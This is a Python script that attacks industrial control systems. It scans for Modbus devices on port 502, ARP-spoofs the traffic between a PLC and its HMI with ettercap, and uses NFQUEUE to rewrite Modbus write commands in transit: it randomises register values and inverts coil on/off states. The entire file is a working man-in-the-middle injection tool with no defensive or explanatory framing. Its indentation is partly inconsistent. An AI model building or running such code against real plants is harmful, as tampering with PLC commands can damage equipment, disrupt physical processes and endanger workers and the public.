from scapy.all import *
from netfilterqueue import NetfilterQueue
import os, nmap
from scapy.contrib import modbus
from random import *

plc_ip = ''
hmi_ip = ''

def scan():
        nm = nmap.PortScanner()
        net = input("enter your network : ")
        nm.scan(hosts=net, arguments='-n -p502 --script modbus-discover.nse')
        hosts_list = [(x, nm[x]['tcp'][502]['state']) for x in nm.all_hosts()]
        for host, state in hosts_list:
            if state == 'open':
                global plc_ip
                plc_ip = host
                print("PLC IP : {}".format(plc_ip))

def psniff(plcip):
        fil = "dst host {} and dst port 502 and tcp[13] = 0x18".format(plcip)
        p = sniff(iface="eth0", count=1, filter=fil)
        x = p[0]
        global hmi_ip
        hmi_ip = x[IP].src
        print("HMI IP : {}".format(hmi_ip))

def get_ip():
        scan()
        arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
        os.system(arp1)
        psniff(plc_ip)
        os.system('pkill -f ettercap')
        sleep(1)

def arp_spoofing():
        arp2 = 'nohup ettercap -Tq -i eth0 -M ARP:oneway /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
        os.system(arp2)
        process = os.popen('pgrep -f ettercap')
        out = process.read()
        process.close()
        print("ettercap is running, PID : {}".format(out))
        print("ARP Poisoning start !!")
        sleep(4)

def process_pkt(packet):
    try:
        z = IP(packet.get_payload())
        func = z.funcCode
        print(z[TCP].chksum)
        print(z[IP].chksum)
        del z[TCP].chksum
        del z[IP].chksum
        del z[IP].len
        del z[TCP].len
        if func == 16:
                print(z[TCP].outputsValue)
                z.outputsValue = randrange(10000, 20000)
        elif func == 5:
                print(z[TCP].outputValue)
                if z.outputValue == 65280:
                        z.outputValue = 0
                elif z.outputValue == 0:
                        z.outputValue = 65280
        packet.set_payload(bytes(z))
        packet.accept()
    except AttributeError:
                packet.accept()

def data_injection():
	QUEUE_NUM = 0
	os.system("iptables -I OUTPUT -p tcp -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
	queue = NetfilterQueue()
	try:
    	queue.bind(QUEUE_NUM, process_pkt)
    	queue.run()
	except KeyboardInterrupt:
    	os.system("iptables --flush && iptables -t nat -F")
    	print("Exiting......")
	queue.unbind()

def main():
	get_ip()
    arp_spoofing()
    data_injection()

main()
